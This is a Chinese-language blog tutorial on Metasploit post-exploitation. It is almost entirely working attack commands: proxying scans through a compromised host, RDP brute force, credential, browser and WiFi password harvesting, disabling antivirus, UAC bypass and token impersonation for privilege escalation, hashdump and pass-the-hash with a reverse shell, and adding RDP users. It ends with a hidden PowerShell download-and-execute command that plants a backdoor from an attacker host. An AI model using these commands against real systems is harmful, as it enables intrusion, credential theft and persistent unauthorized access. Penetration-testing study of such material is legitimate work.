# 原创
：  【kali-漏洞利用】（3.3）Metasploit后渗透（下）：后渗透模块使用

# 【kali-漏洞利用】（3.3）Metasploit后渗透（下）：后渗透模块使用

**目录**

[一、推荐](#%E4%B8%80%E3%80%81%E6%8E%A8%E8%8D%90)

[二、使用](#%E4%BA%8C%E3%80%81%E4%BD%BF%E7%94%A8)

[2.1、网络命令](#2.1%E3%80%81%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4)

[Socks代理](#Socks%E4%BB%A3%E7%90%86)

[2.2、信息收集](#2.2%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)

[常用：](#%E5%B8%B8%E7%94%A8%EF%BC%9A)

[2.3、提权](#2.3%E3%80%81%E6%8F%90%E6%9D%83)

[本地提权：](#%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%EF%BC%9A)

[绕过UAC提权](#%E7%BB%95%E8%BF%87UAC%E6%8F%90%E6%9D%83)

[RunAs提权](#RunAs%E6%8F%90%E6%9D%83)

[假冒令牌提权](#%E5%81%87%E5%86%92%E4%BB%A4%E7%89%8C%E6%8F%90%E6%9D%83)

[2.4、窃取hash及密码](#2.4%E3%80%81%E7%AA%83%E5%8F%96hash%E5%8F%8A%E5%AF%86%E7%A0%81)

[hashdump](#hashdump)

[哈希传递](#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92)

[2.5、RDP](#2.5%E3%80%81RDP)

[开启3389](#%E5%BC%80%E5%90%AF3389)

[远程桌面](#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2)

[2.6、后门植入](#2.6%E3%80%81%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5)

[Powershell后门](#Powershell%E5%90%8E%E9%97%A8)

---


## 一、推荐

[【kali-漏洞利用】（3.3）后渗透之Meterpreter（上）：命令大全<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/126179710?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/126179710?spm=1001.2014.3001.5501)

---


---


## 二、使用

> 
<h3>2.1、网络命令</h3>
<h4>Socks代理</h4>
<pre><code>前提：在目标设备添加完路由，才可以通过msf带的socks4a模块进行socks4代理转发
use auxiliary/server/socks4a
set srvhost 127.0.0.1
set srvport 2000
run

vim /etc/proxychains.conf   #在文件末尾添加socks4代理服务器
</code></pre>
使用proxychains代理访问执行nmap操作
<pre><code>proxychains nmap -sV -p 445 --script=smb-vuln-ms17-010.nse IP  
    #扫描永恒之蓝漏洞
proxychains hydra IP rdp -l administrator -P password.txt -V   
    #rdp服务暴力破解
</code></pre>


> 
<h3>2.2、信息收集</h3>
<h4>常用：</h4>
<pre><code>run arp_scanner -r ip/24  #利用arp进行存活主机扫描
run winenum               #自动化执行一些检测脚本
run credcollect           #获取用户hash
run domain_list_gen         #获取域管理账户列表
run post/multi/gather/env   #获取用户环境变量
run post/windows/gather/enum_logged_on_users -c  #列出当前登录用户
run post/linux/gather/checkvm     #是否虚拟机
run post/windows/gather/checkvm   #是否虚拟机
run post/windows/gather/forensics/enum_drives  #查看磁盘分区信息
run post/windows/gather/enum_applications      #获取安装软件信息
run post/windows/gather/dumplinks   #获取最近访问过的文档、链接信息
run post/windows/gather/enum_ie     #获取IE缓存
run post/windows/gather/enum_firefox  #获取firefox缓存
run post/windows/gather/enum_chrome   #获取Chrome缓存
run post/multi/recon/local_exploit_suggester  #获取本地提权漏洞
run post/windows/gather/enum_patches  #获取补丁信息
run post/windows/gather/enum_domain   #查找域控
run post/windows/gather/enum_snmp     #获取snmp团体名称
run post/windows/gather/credentials/vnc  #获取vnc密码
run post/windows/wlan/wlan_profile       #用于读取目标主机WiFi密码
run post/multi/gather/wlan_geolocate     #基于wlan进行地理位置确认 文件位于/root/.msf4/loot
run post/windows/manage/killav           #关闭杀毒软件
</code></pre>


> 
<h3>2.3、提权</h3>
<h4>本地提权：</h4>
搜集补丁信息，寻找可利用exploits提权
<pre><code>run post/windows/gather/enum_patches  #查看补丁信息
background
search MS10-015
use exploit/windows/local/ms10_015_kitrap0d
set session 8
run
</code></pre>
<hr/>
<h4>绕过UAC提权</h4>
msf内置bypassuac脚本，原理不同，使用方法类似
执行后返回一个新的会话，再次执行getsystem即可提权
<pre><code>exploit/windows/local/bypassuac
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/bypassuac_injection
exploit/windows/local/bypassuac_injection_winsxs
exploit/windows/local/bypassuac_silentcleanup
exploit/windows/local/bypassuac_vbs
</code></pre>
命令getsystem提权失败，再利用bypassuac来提权
例如exploit/windows/local/bypassuac模块(32位、64位都有效)
<pre><code>use exploit/windows/local/bypassuac
set session 1
run
</code></pre>
<hr/>
<h4>RunAs提权</h4>
利用exploit/windows/local/ask模块(32、64位)，创建一个可执行文件并在目标机上发起一个提升权限请求的程序，触发系统UAC，提示用户是否进行更改，若选择“是”，拿到高权限的meterpreter shell
<pre><code>use exploit/windows/local/ask
set filename update.exe  # 设置反弹程序名称
set session 1
run
</code></pre>
前提：
系统当前用户须在管理员组或者知道管理员的密码
用户账户控制程序UAC设置则没有要求
会创建一个可执行文件，该可执行文件（需进行免杀处理）的创建要使用EXE::Custom选项
<hr/>
<h4>假冒令牌提权</h4>
令牌是系统临时密钥，它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源。这些令牌将持续存在于系统中，除非系统重新启动。
两种类型的令牌：
一种是Delegation Tokens（授权令牌），支持交互式登录（eg：远程桌面登陆登录）
一种是Impersonation Tokens（模拟令牌），非交互的会话（eg：访问文件共享）
<pre><code>use incognito     #加载窃取令牌模块 
list_tokens -u    #查看可用的用户令牌
list_tokens -g    #查看可用的用户组令牌
impersonate_token 'NT AUTHORITY\SYSTEM'  #假冒SYSTEM token
rev2self          #返回原始token
</code></pre>


#### 绕过UAC提权

---


#### 假冒令牌提权

> 
<h3>2.4、窃取hash及密码</h3>
<h4>hashdump</h4>
<pre><code>hashdump
run post/windows/gather/smart_hashdump

#得到的hash解密即用户密码</code></pre>
<hr/>
<h4>哈希传递</h4>
利用hashdump得到用户的hash
再利用psexec模块进行哈希传递攻击<br/> 使用psexec的前提：SMB服务必须开启（开启445端口）；Admin$可以访问
<pre><code>use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.183.147
set LPORT 443
set RHOST 192.168.183.154
set SMBUSER Administrator
set SMBPASS ccf**4ee:3db**678
set SMBDOMAIN  WORKGROUP   # 域用户需要设置SMBDOMAIN
run
</code></pre>


#### 哈希传递

> 
<h3>2.5、RDP</h3>
<h4>开启3389</h4>
通过enable_rdp脚本将用户添加到远程桌面用户组和管理员用户组
<pre><code>run post/windows/manage/enable_rdp   #开启远程桌面
run post/windows/manage/enable_rdp USERNAME=admin PASSWORD=admin #添加用户
run post/windows/manage/enable_rdp FORWARD=true LPORT=6667       #将3389端口转发到6667
</code></pre>
<hr/>
<h4>远程桌面</h4>
<pre><code>enumdesktops  #查看可用的桌面
getdesktop    #获取当前meterpreter 关联的桌面
setdesktop    #设置meterpreter关联的桌面  -h查看帮助
run vnc       #使用vnc远程桌面连接
rdesktop 127.0.0.1:1111   #需要输入用户名密码连接
rdesktop -u Administrator -p 123 127.0.0.1:1111  #-u 用户名 -p 密码
</code></pre>


#### 远程桌面

> 
<h3>2.6、后门植入</h3>
<h4>Powershell后门</h4>
<pre><code>use exploit/multi/script/web_delivery
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.183.147
set LPORT 2334
set srvport 2333
set uripath /
set target 5
run

在目标设备cmd上执行以下命令即可反弹
powershell.exe -nop -w hidden -c $z="echo ($env:temp+'\eJedcsJE.exe')"; (new-object System.Net.WebClient).DownloadFile('http://192.168.183.147:2333/', $z); invoke-item $z
</code></pre>


（注：命令来源于网络）
